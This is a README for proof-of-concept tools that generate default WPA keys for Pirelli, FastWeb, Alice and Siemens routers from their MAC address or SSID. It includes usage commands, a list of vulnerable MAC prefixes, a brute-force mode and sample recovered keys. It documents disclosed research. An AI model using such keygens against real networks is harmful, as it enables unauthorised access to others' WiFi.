Vulnerabilidades nos Routers ADB Italia da MEO. 
==

+ Este algoritmo permite gerar as chaves de encriptação WPA pré-definidas nos Routers da MEO com o SSID "ADSLPT-XXXXXX"

References
----

* Every script has its references in it. Please look at them for more info.


Contact
----

Coder  : Eduardo Novella    Twitter : [@enovella_](https://twitter.com/enovella_)
Website: (http://ednolo.alumnos.upv.es/)


Licence
----
GPLv3
http://gplv3.fsf.org/

More info
----

+ http://ednolo.alumnos.upv.es/?p=1883

Usage pirelli
----

	$ python pirelli.py -v
	pirelli.py 1.4 [2015-05-06] ----> http://www.ednolo.alumnos.upv.es

	$ python pirelli.py 
	usage: pirelli.py [-h] [-b [BSSID]] [-v] [-l | -a]

	>>> PoC WPA keygen for WiFi Networks deployed by Arnet in Argentina and MEO in
	Portugal. So far only WiFi networks with essids like WiFi-Arnet-XXXX or
	ADSLPT-ABXXXXX and manufactured by Pirelli are likely vulnerable. See
	http://ednolo.alumnos.upv.es/ for more details. Twitter: @enovella_ and email:
	ednolo[at]inf.upv.es. This software is used just as proof-of-concept, commit
	fraud depends on you!

	optional arguments:
	  -h, --help            show this help message and exit
	  -v, --version         show program's version number and exit
	  -l, --list            List all vulnerable targets
	  -a, --allkeys         Bruteforce mode

	required:
	  -b [BSSID], --bssid [BSSID]
	                        Target mac address

	(+) Help: python pirelli.py -b 74:88:8B:AD:C0:DE

	$ python pirelli.py -l
	[+] Possible vulnerable targets so far:
		 bssid: 00:08:27:XX:XX:XX 	 essid: WiFi-Arnet-XXXX, ADSLPT-ABXXXXX
		 bssid: 00:13:C8:XX:XX:XX 	 essid: WiFi-Arnet-XXXX, ADSLPT-ABXXXXX
		 bssid: 00:17:C2:XX:XX:XX 	 essid: WiFi-Arnet-XXXX, ADSLPT-ABXXXXX
		 bssid: 00:19:3E:XX:XX:XX 	 essid: WiFi-Arnet-XXXX, ADSLPT-ABXXXXX
		 bssid: 00:1C:A2:XX:XX:XX 	 essid: WiFi-Arnet-XXXX, ADSLPT-ABXXXXX
		 bssid: 00:1D:8B:XX:XX:XX 	 essid: WiFi-Arnet-XXXX, ADSLPT-ABXXXXX
		 bssid: 00:22:33:XX:XX:XX 	 essid: WiFi-Arnet-XXXX, ADSLPT-ABXXXXX
		 bssid: 00:8C:54:XX:XX:XX 	 essid: WiFi-Arnet-XXXX, ADSLPT-ABXXXXX
		 bssid: 30:39:F2:XX:XX:XX 	 essid: WiFi-Arnet-XXXX, ADSLPT-ABXXXXX
		 bssid: 74:88:8B:XX:XX:XX 	 essid: WiFi-Arnet-XXXX, ADSLPT-ABXXXXX
		 bssid: 84:26:15:XX:XX:XX 	 essid: WiFi-Arnet-XXXX, ADSLPT-ABXXXXX
		 bssid: A4:52:6F:XX:XX:XX 	 essid: WiFi-Arnet-XXXX, ADSLPT-ABXXXXX
		 bssid: A4:5D:A1:XX:XX:XX 	 essid: WiFi-Arnet-XXXX, ADSLPT-ABXXXXX
		 bssid: D0:D4:12:XX:XX:XX 	 essid: WiFi-Arnet-XXXX, ADSLPT-ABXXXXX
		 bssid: D4:D1:84:XX:XX:XX 	 essid: WiFi-Arnet-XXXX, ADSLPT-ABXXXXX
		 bssid: DC:0B:1A:XX:XX:XX 	 essid: WiFi-Arnet-XXXX, ADSLPT-ABXXXXX
		 bssid: F0:84:2F:XX:XX:XX 	 essid: WiFi-Arnet-XXXX, ADSLPT-ABXXXXX

	$ python pirelli.py -b 74:88:8B:AD:C0:DE
	[+] MAC     : 74:88:8B:AD:C0:DE
	[+] WPA key : 057mjyggor	SSID: WiFi-Arnet-XXXX (Argentina)
	[+] WPA key : 057mjygg  	SSID: ADSLPT-ABXXXXX  (Portugal)

	$ python pirelli.py -b 74:88:8B:AD:C0:DE -a
	[+] MAC     : 74:88:8B:AD:C0:DE

	[+] WPA keys for SSID: WiFi-Arnet-XXXX (Argentina)
	3c1nrhqy5z
	tugh1hcfog
	057mjyggor
	hj0wl2c2r7
	9yw6um3tc5
	ituqajo8iq
	wfti5odq8c

	[+] WPA keys for SSID: ADSLPT-ABXXXXX  (Portugal)
	3c1nrhqy  
	tugh1hcf  
	057mjygg  
	hj0wl2c2  
	9yw6um3t  
	ituqajo8  
	wfti5odq  




Usage fastweb
----

	$ python fastweb.py FASTWEB-1-00193EA1B2C3
	 --------------------------------------------------------------------
	|                       FastWeb Routers Wi-Fi                        |
	|--------------------------------------------------------------------|
	|                 Default WPA Key Algorithm Weakness                 |
	|               Eduardo Novella <@enovella_>                         |
	 --------------------------------------------------------------------
	fastweb.py 0.1.1    2013/07/10     [http://www.ednolo.alumnos.upv.es]


	[+] SSID   : FASTWEB-1-00193EA1B2C3
	[+] MAC    : 00193EA1B2C3 
	[+] MD5    : a37d4267f1d177f44d352978d95558a9
	[+] Extract: a37d4267 
	[+] Binary : 10100011011111010100001001100111
	[+] WPA key: 6b64756b04


Usage Alice AGPF
----

	$ python aliceAGPF.py 
	 --------------------------------------------------------------------
	|                PIRELLI Alice Gate VoIP 2 Plus Wi-Fi   (ITALY)      |
	|--------------------------------------------------------------------|
	|                 Default WPA Key Algorithm Weakness                 |
	|               Eduardo Novella <@enovella_>                         |
	 --------------------------------------------------------------------
	aliceAGPF.py 0.1.1    2013/07/10    [http://www.ednolo.alumnos.upv.es]


		 usage: python aliceAGPF.py [MAC]  [ESSID]

		 eg. python aliceAGPF.py  00:23:8E:01:02:03  Alice-96345678

	$ python aliceAGPF.py 00:23:8E:01:02:03  Alice-96345678
	 --------------------------------------------------------------------
	|                PIRELLI Alice Gate VoIP 2 Plus Wi-Fi   (ITALY)      |
	|--------------------------------------------------------------------|
	|                 Default WPA Key Algorithm Weakness                 |
	|               Eduardo Novella <@enovella_>                         |
	 --------------------------------------------------------------------
	aliceAGPF.py 0.1.1    2013/07/10    [http://www.ednolo.alumnos.upv.es]


	[+] SSID   : Alice-96345678
	[+] MAC    : 00238E010203 
	[+] SHA256 : 321948e63878d7dff841ee37ddd29ab3dd957589ef993df3286907f790bfc52a
	[+] WPA key: ep0ekcz7wtmj5uaz559tn9pr


Usage Alice Siemens
----

	$ python aliceSiemens.py 
	 --------------------------------------------------------------------
	|       Alicebox 1121 - Siemens  S1621-Z220-A           (GERMANY)    |
	|--------------------------------------------------------------------|
	|                 Default WPA Key Algorithm Weakness                 |
	|               Eduardo Novella <@enovella_>                         |
	 --------------------------------------------------------------------
	aliceSiemens.py 0.1.0    2013/07/10    [http://www.ednolo.alumnos.upv.es]


		 usage: python aliceSiemens.py [MAC] 

		 eg. python aliceSiemens.py  00:25:5E:01:02:03


	$ python aliceSiemens.py  00:25:5E:01:02:03
	 --------------------------------------------------------------------
	|       Alicebox 1121 - Siemens  S1621-Z220-A           (GERMANY)    |
	|--------------------------------------------------------------------|
	|                 Default WPA Key Algorithm Weakness                 |
	|               Eduardo Novella <@enovella_>                         |
	 --------------------------------------------------------------------
	aliceSiemens.py 0.1.0    2013/07/10    [http://www.ednolo.alumnos.upv.es]


	[+] SSID     : Alicebox????
	[+] MAC WLAN : 00255E010203 
	[+] MAC ETH  : 00255E010202
	[+] MD5 snip : 9fe800c9b138
	[+] WPA key  : OWZlODAwYzliMTM4


